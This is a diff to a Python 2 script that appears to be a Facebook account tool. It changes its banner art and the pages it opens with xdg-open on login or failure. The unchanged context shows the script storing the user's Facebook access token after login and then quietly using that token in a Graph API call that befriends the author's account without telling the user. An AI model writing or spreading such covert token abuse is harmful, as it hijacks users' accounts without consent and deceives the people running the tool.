@@ -59,8 +59,8 @@ logo = """
 \033[1;91m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚══╝
 \033[1;96m::♧♧♧♧♧♧\033[1;91mFacebook Id\033[1;96m♧♧♧♧♧♧▒▒▒▒▒▒▒     
 \033[1;91m:》》》\033[1;93mShymon Hasan\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:
-\033[1;95m♡╭─────────•◈•─────────╮♡\033[1;96m-Rafin-\033[1;95m♡╭─────────•◈•─────────╮♡
-\033[1;92m.....................RAFIN CREATION...................
+\033[1;95m♡╭──────•◈•──────╮♡\033[1;96m-Rafin-\033[1;95m♡╭───────•◈•──────╮♡
+\033[1;92m................RAFIN CREATION................
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
 \033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║ 
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
@@ -68,7 +68,7 @@ logo = """
 █▄─▀█▀─▄█▄─▄█─▄─▄─█─█─█▄─▄█▄─▄████▀▄─██
 ██─█▄█─███─████─███─▄─██─███─██▀██─▀─██
 ▀▄▄▄▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRafinVau\033[1;95m♡╰──────────•◈•──────╯♡"""
+\033[1;95m♡╰───────•◈•───────╯♡\033[1;96mRafinVau\033[1;95m♡╰──────•◈•──────╯♡"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -123,10 +123,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
+            os.system('xdg-open https://www.facebook.com/I.Fuak.Your.MinD')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
+        os.system('xdg-open https://www.facebook.com/I.Fuak.Your.MinD')
 
 def login():
 	os.system('clear')
@@ -170,7 +170,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://www.facebook.com/I.FueK.YoUr.MiNd.BnXD')
+				os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
